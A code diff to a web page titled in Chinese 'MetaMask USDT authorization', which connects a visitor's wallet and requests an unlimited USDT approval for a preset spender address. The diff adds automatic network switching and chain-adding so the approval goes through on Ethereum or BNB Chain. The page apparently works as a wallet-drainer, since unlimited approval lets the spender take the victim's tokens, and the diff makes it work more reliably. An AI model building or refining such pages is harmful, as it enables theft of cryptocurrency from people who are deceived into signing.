@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>MetaMask USDT 授权 (EVM 链)</title>
     <style>
-        /* 样式与之前相同，略 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -152,6 +151,24 @@
         };
         const UNLIMITED_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
+        // 网络配置（用于切换）
+        const NETWORKS = {
+            1: {
+                chainId: '0x1',
+                chainName: 'Ethereum Mainnet',
+                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                rpcUrls: ['https://mainnet.infura.io/v3/'],
+                blockExplorerUrls: ['https://etherscan.io']
+            },
+            56: {
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com']
+            }
+        };
+
         let currentChain = '1';
         let provider = null;
 
@@ -183,11 +200,35 @@
             spenderDisplay.textContent = SPENDER_ADDRESS[currentChain];
         }
 
-        // 链切换
-        function onChainChange(chainId) {
-            currentChain = chainId;
-            updateSpenderDisplay();
-            hideStatus();
+        // 检查并切换网络
+        async function switchNetwork(targetChainId) {
+            const targetHex = '0x' + parseInt(targetChainId).toString(16);
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: targetHex }]
+                });
+                return true;
+            } catch (error) {
+                if (error.code === 4902) {
+                    // 网络未添加，尝试添加
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [NETWORKS[targetChainId]]
+                        });
+                        return true;
+                    } catch (addError) {
+                        console.error('添加网络失败:', addError);
+                        showDialog(`添加网络失败: ${addError.message}`);
+                        return false;
+                    }
+                } else {
+                    console.error('切换网络失败:', error);
+                    showDialog(`切换网络失败: ${error.message}`);
+                    return false;
+                }
+            }
         }
 
         // 授权函数
@@ -198,8 +239,24 @@
             }
             hideStatus();
             showStatus('正在连接钱包...', 'loading');
+
             try {
-                const chainId = parseInt(currentChain);
+                const targetChainId = parseInt(currentChain);
+                // 检查当前网络
+                const currentChainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+                const currentChainId = parseInt(currentChainIdHex, 16);
+
+                if (currentChainId !== targetChainId) {
+                    showStatus(`当前网络不是目标网络，正在切换...`, 'loading');
+                    const switched = await switchNetwork(targetChainId);
+                    if (!switched) {
+                        showStatus('网络切换失败，请手动切换到目标网络', 'error');
+                        return;
+                    }
+                    // 等待一小段时间让网络切换生效
+                    await new Promise(resolve => setTimeout(resolve, 500));
+                }
+
                 // 请求账户
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const userAddress = accounts[0];
@@ -209,17 +266,16 @@
                 const iface = new ethers.utils.Interface([
                     'function approve(address spender, uint256 amount) returns (bool)'
                 ]);
-                const data = iface.encodeFunctionData('approve', [SPENDER_ADDRESS[chainId], UNLIMITED_AMOUNT]);
+                const data = iface.encodeFunctionData('approve', [SPENDER_ADDRESS[targetChainId], UNLIMITED_AMOUNT]);
                 const transaction = {
-                    to: USDT_ADDRESS[chainId],
+                    to: USDT_ADDRESS[targetChainId],
                     from: userAddress,
                     data: data,
-                    chainId: chainId
+                    chainId: targetChainId
                 };
 
-                // 打印调试信息
                 console.log('发送交易:', {
-                    chainId: chainId,
+                    chainId: targetChainId,
                     to: transaction.to,
                     from: transaction.from,
                     data: transaction.data
@@ -242,6 +298,13 @@
                 showStatus(`授权失败: ${errorMsg}`, 'error');
                 showDialog(`授权失败: ${errorMsg}\n请检查控制台输出获取更多信息。`);
             }
+        }
+
+        // 链切换
+        function onChainChange(chainId) {
+            currentChain = chainId;
+            updateSpenderDisplay();
+            hideStatus();
         }
 
         // 初始化
